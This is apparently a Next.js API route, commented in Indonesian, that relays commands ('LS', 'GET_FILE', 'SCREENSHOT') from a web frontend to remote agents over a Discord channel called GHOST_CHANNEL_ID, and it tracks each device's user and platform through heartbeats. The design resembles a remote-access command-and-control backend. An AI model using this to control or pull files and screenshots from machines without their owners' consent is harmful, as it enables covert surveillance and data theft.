import { NextRequest, NextResponse } from "next/server";
import { discord } from "@/lib/discord-api-handler";
import { sendMessage, sanitizeMessage } from "@/lib/utils";
import { GHOST_CHANNEL_ID } from "@/lib/constants";

export const dynamic = "force-dynamic";

// ID Channel khusus untuk Registry Devices (Penting: Pisahkan dari command channel agar bersih)
// Anda bisa membuat channel baru di Discord dan masukkan ID-nya di sini
// Untuk sekarang kita pakai GHOST_CHANNEL_ID, tapi idealnya dipisah.
// const REGISTRY_MESSAGE_ID_FILE = "device_registry.json"; // Virtual "file" name in Discord storage concept

// --- TYPES ---
interface DeviceStatus {
  id: string;
  name: string;
  ram_usage: number;
  ram_total: number;
  platform: string;
  user: string;
  last_seen: number;
}

// 1. GET: Dipanggil Agent (Polling Command) ATAU Frontend (Fetch Devices)
export async function GET(req: NextRequest) {
  const { searchParams } = new URL(req.url);
  const deviceId = searchParams.get("deviceId");
  const action = searchParams.get("action");

  // CASE A: Frontend minta daftar device
  if (action === "list_devices") {
    const devices = await getDeviceRegistry();
    return NextResponse.json(devices);
  }

  // CASE B: Agent Polling Command
  if (deviceId) {
    try {
      // Ambil pesan terakhir
      const messages = await discord.get<any[]>(
        `/channels/${GHOST_CHANNEL_ID}/messages?limit=5`,
      );
      if (!messages) return NextResponse.json(null);

      // Cari command yang ditujukan untuk deviceID ini dan statusnya PENDING
      for (const msg of messages) {
        const sanitized = sanitizeMessage(msg);
        let content: any = sanitized.content;

        // Handle content if string
        if (typeof content === "string") {
          try {
            content = JSON.parse(content);
          } catch {
            continue;
          }
        }

        if (
          content &&
          content.target_id === deviceId &&
          content.status === "PENDING"
        ) {
          return NextResponse.json({
            messageId: msg.id,
            command: content.cmd,
            args: content.args,
          });
        }
      }
      return NextResponse.json(null);
    } catch (error) {
      return NextResponse.json(null);
    }
  }

  return NextResponse.json({ error: "Invalid request" }, { status: 400 });
}

// 2. POST: Handle Heartbeat & Command Response
export async function POST(req: NextRequest) {
  try {
    const body = await req.json();

    // CASE A: Agent Heartbeat (Update Registry)
    if (body.action === "heartbeat") {
      await updateDeviceRegistry(body);
      return NextResponse.json({ success: true });
    }

    // CASE B: Agent Responding to Command
    if (body.action === "response") {
      // Hapus pesan command (PENDING)
      if (body.reply_to_id) {
        await discord.delete(
          `/channels/${GHOST_CHANNEL_ID}/messages/${body.reply_to_id}`,
        );
      }

      // Post Result (Sebagai pesan baru bertipe RESULT)
      const payload = {
        type: "RESULT",
        target_id: body.device_id,
        status: body.status,
        data: body.data,
        timestamp: Date.now(),
      };

      // Kirim hasil ke channel biar Frontend bisa baca (polling di frontend)
      await sendMessage(GHOST_CHANNEL_ID, {
        content: `\`\`\`json\n${JSON.stringify(payload)}\n\`\`\``,
      });

      return NextResponse.json({ success: true });
    }

    // CASE C: Frontend Mengirim Command Baru
    if (body.action === "queue_command") {
      const payload = {
        status: "PENDING",
        target_id: body.deviceId,
        cmd: body.command, // "LS", "GET_FILE", "SCREENSHOT"
        args: body.args || null,
        timestamp: Date.now(),
      };

      await sendMessage(GHOST_CHANNEL_ID, {
        content: `\`\`\`json\n${JSON.stringify(payload)}\n\`\`\``,
      });

      return NextResponse.json({ success: true });
    }

    return NextResponse.json({ error: "Invalid action" }, { status: 400 });
  } catch (error) {
    console.error(error);
    return NextResponse.json({ error: "Server error" }, { status: 500 });
  }
}

// --- HELPER: Device Registry (Mock DB in Memory / Discord Message) ---
// Note: Idealnya pakai database beneran (Redis/Postgres).
// Karena ini "Discord DBaaS", kita simpan state device di variable global serverless (ini bakal reset tiap cold boot Vercel),
// ATAU kita bisa simpan di Discord message spesifik.
// Untuk performa, kita pakai Global Cache + Discord Sync.

let deviceCache: Record<string, DeviceStatus> = {};

async function getDeviceRegistry() {
  // Return cache for speed + online check logic
  const now = Date.now();
  const activeDevices = Object.values(deviceCache).map((d) => ({
    ...d,
    is_online: now - d.last_seen < 15000, // 15 detik timeout
  }));
  return activeDevices;
}

async function updateDeviceRegistry(data: any) {
  deviceCache[data.device_id] = {
    id: data.device_id,
    name: data.device_name,
    ram_usage: data.ram_usage,
    ram_total: data.ram_total,
    platform: data.platform,
    user: data.user,
    last_seen: Date.now(),
  };
  // Note: Di Vercel Serverless, cache ini hilang kalau idle.
  // Jika butuh persistent, harus write ke Discord message (tapi rate limit bakal kena kalau heartbeat sering).
  // Solusi: Agent heartbeat tiap 5s, tapi Next.js cuma update memori.
  // UI akan request data ke Next.js.
}
